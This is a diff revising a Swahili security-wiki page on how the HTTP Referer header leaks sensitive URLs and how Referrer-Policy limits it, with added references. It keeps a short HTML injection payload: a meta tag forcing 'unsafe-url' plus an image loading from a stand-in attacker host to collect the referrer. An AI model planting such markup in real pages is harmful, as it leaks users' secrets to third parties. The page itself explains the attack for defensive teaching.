@@ -1,19 +1,19 @@
-# Interesting HTTP
+# Tabia ya Kuvutia ya HTTP
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Referrer headers and policy
+## Kichwa cha `Referer` na Sera ya Referrer
 
-Referrer ni header inayotumiwa na browsers kuonyesha ni ukurasa gani uliotembelewa awali.
+Kichwa cha ombi cha HTTP `Referer` hutambulisha URL kamili au sehemu ya URL ambayo rasilimali iliombwa kutoka humo. Kulingana na sera ya referrer inayotumika, kinaweza kujumuisha origin, path na query string inayorejelea, lakini si URL fragment.<sup>[[1]](#references)</sup>
 
-### Taarifa nyeti leaked
+### Sensitive Information Leak
 
-Ikiwa wakati fulani ndani ya ukurasa wa wavuti kuna taarifa nyeti kwenye parameters za GET request, ikiwa ukurasa una links zinazoelekeza kwenye vyanzo vya nje au attacker anaweza kumfanya/kumshauri (social engineering) mtumiaji kutembelea URL inayodhibitiwa na attacker. Anaweza ku-exfiltrate taarifa nyeti zilizo ndani ya GET request ya mwisho.
+Siri zilizo kwenye URL paths au query parameters zinaweza kuvuja kupitia historia ya browser, logs, analytics, links zilizokopiwa na kichwa cha `Referer`. Kwa hivyo, link ya cross-origin au ombi la subresource linaweza kufichua URL inayorejelea kwa server ya nje.<sup>[[2]](#references)</sup>
 
-### Mitigation
+### Hatua za Kupunguza Hatari
 
-Unaweza kuifanya browser ifuate **Referrer-policy** ambayo inaweza **kuzuia** taarifa nyeti kutumwa kwenye web applications nyingine:
-```
+Tumia kichwa cha jibu cha `Referrer-Policy` kudhibiti kiasi cha maelezo ya referrer ambayo browser hutuma. `strict-origin-when-cross-origin` ndiyo default ya kisasa katika browsers, huku `no-referrer` ikikandamiza kabisa kichwa hicho; chagua sera inayolingana na mahitaji ya application.<sup>[[3]](#references)</sup>
+```http
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
 Referrer-Policy: origin
@@ -23,15 +23,21 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-### Kupinga Mitigation
+Usiweke passwords, vitambulisho vya session, API keys, au thamani nyingine nyeti kwenye URLs. Zitume katika request headers au bodies zinazofaa kupitia TLS badala yake.<sup>[[2]](#references)</sup>
 
-Unaweza kubatilisha sheria hii kwa kutumia HTML meta tag (mshambuliaji anahitaji kutumia HTML injection):
+### Mazingatio ya HTML Injection
+
+Hati inaweza pia kuweka policy ya ukurasa mzima kwa kutumia `<meta name="referrer">`. Ikiwa dosari ya HTML injection inamruhusu mshambulizi kuingiza meta element inayofanya kazi, mshambulizi anaweza kujaribu kudhoofisha policy ya hati kwa requests zinazofuata. Meta policies zinazoingizwa dynamically au zinazokinzana zinaweza kufanya kazi bila kutabirika, kwa hiyo thibitisha tabia hiyo katika browser lengwa badala ya kudhani kwamba response header daima itabatilishwa.<sup>[[4]](#references)</sup>
 ```html
 <meta name="referrer" content="unsafe-url">
-<img src="https://attacker.com">
+<img src="https://attacker.example/collect" alt="">
 ```
-## Ulinzi
+Rekebisha HTML injection iliyopo kwenye msingi na uweke data nyeti nje ya URL; referrer policy ni ulinzi wa tabaka nyingi, si mbadala wa udhibiti wowote kati ya hiyo miwili.
 
-Usiweke kamwe data yoyote nyeti ndani ya GET parameters au paths katika URL.
+## References
 
+- [1] [MDN - Kichwa cha `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
+- [2] [MITRE CWE-598 - Matumizi ya GET Request Method Yenye Query Strings Nyeti](https://cwe.mitre.org/data/definitions/598.html)
+- [3] [MDN - Kichwa cha `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
+- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
 {{#include ../banners/hacktricks-training.md}}
